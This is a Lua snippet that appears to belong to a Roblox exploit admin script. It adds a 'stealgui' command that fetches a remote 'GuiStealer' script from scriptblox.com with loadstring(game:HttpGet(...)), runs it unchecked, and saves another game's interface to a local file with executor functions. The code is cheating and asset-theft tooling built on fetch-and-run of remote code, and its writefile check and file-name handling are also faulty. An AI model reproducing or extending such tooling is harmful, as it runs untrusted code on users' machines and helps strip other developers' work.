addcmd('stealgui', {'stealguis'}, function(args, speaker)
    if not args[1] then
        notify('stealgui', 'Usage: stealgui <UI> <FileName>')
        return
    end

    local UI = args[1]
    local FileName = args[2]

    if not writefile and isfile then
        notify('stealgui', 'writefile not supported!')
        return
    end

    local function getAvailableFileName(baseName)
        local counter = 0
        local extension = ".rbxm"
        local nameWithoutExtension = baseName or "IYRsavedgui"

        if baseName:find("%.") then
            nameWithoutExtension = baseName:match("^(.*)%..+$")
            extension = baseName:match("%..+$")
        end

        local newName = baseName

        while isfile(newName) do
            counter += 1
            newName = string.format("%s (%d)%s", nameWithoutExtension, counter, extension)
        end

        return newName
    end

    local success, StealGUI = pcall(function()
        return loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-GuiStealer-12751/"))()
    end)

    if not success or not StealGUI then
        notify('stealgui', 'Failed to load GUI stealer.')
        return
    end

    local filtName = getAvailableFileName(FileName)

    local writeSuccess, errorMsg = pcall(function()
        writefile(filtName, StealGUI(UI))
    end)

    if writeSuccess then
        notify('stealgui', 'GUI successfully saved as ' .. filtName)
    else
        notify('stealgui', 'Failed to save GUI: ' .. tostring(errorMsg))
    end
end)

